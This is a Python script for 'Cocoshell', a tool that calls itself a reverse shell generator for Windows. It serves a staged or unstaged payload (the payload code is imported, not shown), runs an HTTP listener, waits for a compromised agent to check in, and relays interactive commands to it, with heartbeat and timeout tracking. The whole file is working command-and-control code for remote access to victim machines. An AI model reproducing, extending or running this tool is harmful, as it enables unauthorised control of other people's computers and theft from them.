#!/usr/bin/env python
import subprocess, time, sqlite3, argparse, os, sys, random, string, requests, datetime
from os.path import exists
from core.payload import *
from core.log import Log
from core.db import Db

parser = argparse.ArgumentParser(
    prog='Cocoshell',
    description='A reverse shell generator for windows and listener that uses http to establish a connection.',
    epilog='''
    tbd
    '''
)
parser.add_argument("-l", "--lhost", help="the ip the agent will connect to")
parser.add_argument("-p", "--lport", help="the port the agent will connect to (default: 5000)")
parser.add_argument("-f", "--frequency", help="the amount of seconds the agent waits for the next command (default: 1)")
parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
parser.add_argument("-v", "--verbose", help="debug messages will be printed to the console", action="store_true")
parser.add_argument("-t", "--timeout", help="the amount of seconds after which a command is cancelled (default: 30)", type=int)
parser.add_argument("--unstaged", help="this will print the full payload instead of the staged one", action="store_true")
parser.add_argument("-db", "--database", help="the sqlite3 database to use")
args, leftovers = parser.parse_known_args()

letters = string.ascii_lowercase
route = args.route if args.route is not None else ''.join(random.choice(letters) for i in range(8))

logger = Log(args.verbose)

if args.lhost is not None:
    lhost = args.lhost
else:
    logger.failed("please use -l/--lhost to specify the ip the agent will connect to")
    sys.exit(0)

lport = args.lport if args.lport is not None else '5000'
frequency = args.frequency if args.frequency is not None else 1
timeout_cmd = args.timeout + frequency if args.timeout is not None else 30 + frequency
timeout_agent = 60 + frequency
dbname = args.database if args.database is not None else "cocoshell.db"

logger.debug("Cocoshell API starting")

api_url = 'http://0.0.0.0:' + lport
agent_url = 'http://' + lhost + ':' + lport + '/' + route

try:
    api_log = open("logs/cocoshell_api.log", "a+")
except FileNotFoundError:
    with open("logs/cocoshell_api.log", "a+") as f:
        f.write('')
    api_log = open("logs/cocoshell_api.log", "a+")

proc = subprocess.Popen(["python3", "core/api.py", "-r", route, "-u", agent_url, "-f", str(frequency)], stdout=api_log)
logger.info(f"Cocoshell API started on {api_url}")
logger.info(f"Agent will connect to {agent_url}")
logger.debug("Connecting to database")
time.sleep(2.0)
db = Db(dbname, args.verbose)

if args.unstaged:
    logger.payload(generate_payload(agent_url, frequency))
else:
    logger.payload(generate_iwr(agent_url))

waiting_for_result = False
result = None
prompt = "cocoshell"
pwd = ''
agent_has_connected = False
agent_is_quitting = False

#############################################################################

def command_has_timed_out(start):
    difference = datetime.datetime.now() - start
    timed_out = True if difference.total_seconds() > timeout_cmd else False
    return timed_out

#############################################################################

try:
    while (True):
        if agent_is_quitting:
            time.sleep(frequency + 1)
            logger.info("waiting for new agent to connect")
            agent_is_quitting = False

        response = requests.get(agent_url + '/pwd')
        pwd = response.text

        if pwd == "NULL":
            time.sleep(1.0)
            continue
        if db.is_active(timeout_agent):
            logger.warn("the agent seems to have timed out")
            logger.info("use 'pulse' to check when the agent last checked in")
        if not agent_has_connected:
            logger.info("an agent has connected")
            logger.important("DO NOT start anything interactive as it will break the shell!")
            agent_has_connected = True

        command = input(f"*{prompt}* {pwd}> ").strip()
        command_start_time = datetime.datetime.now()

        if command == "exit":
            raise SystemExit
        if command == "help":
            logger.print_help()
            continue
        if command == "":
            continue
        if command in ["cd ..", "cd .", "cd"]:
            logger.failed("you cannot use dots in the command")
            continue
        if command in ["pulse"]:
            logger.info(f"agent last checked in at {db.get_heartbeat()}")
            continue

        waiting_for_result = db.new_command(command)
        if (command == "raw"):
            generate_payload(agent_url, frequency)
            waiting_for_result = False
        if (command == "exit-agent"):
            waiting_for_result = False
            logger.warn("telling the agent to quit")
            pwd, waiting_for_result, agent_is_quitting, agent_has_connected = ['NULL', False, True, False]
        if ("set-frequency" in command):
            waiting_for_result = False
            frequency_array = command.split("set-frequency")
            frequency_seconds = frequency_array[1].strip()
            logger.info("telling the agent to sleep for " + str(frequency_seconds) + " seconds between each request")
            time.sleep(int(frequency))
            frequency = frequency_seconds
            db.set_result("NULL")

        while (waiting_for_result):
            if command_has_timed_out(command_start_time):
                db.reset_agent()
                logger.warn("the command has timed out")
                logger.info("use 'pulse' to check when the agent last checked in")
                break
            if db.get_last_result()[3] == 1:
                waiting_for_result = False
                command_start_time = None
                result = db.get_last_result()
                if result[2]:
                    logger.debug("received output from agent")
                    cleaned_result = result[2].replace('%NL%', os.linesep)
                    if cleaned_result != "True":
                        logger.message(cleaned_result)
                else:
                    logger.failed("no output for that command")
                    logger.failed("the command probably failed")
            else:
                time.sleep(0.5)
    
except KeyboardInterrupt:
    print("")
    logger.important("Ctrl+C detected")
    pass
except SystemExit:
    
    logger.debug("Exiting")
    pass
finally:
    proc.terminate()
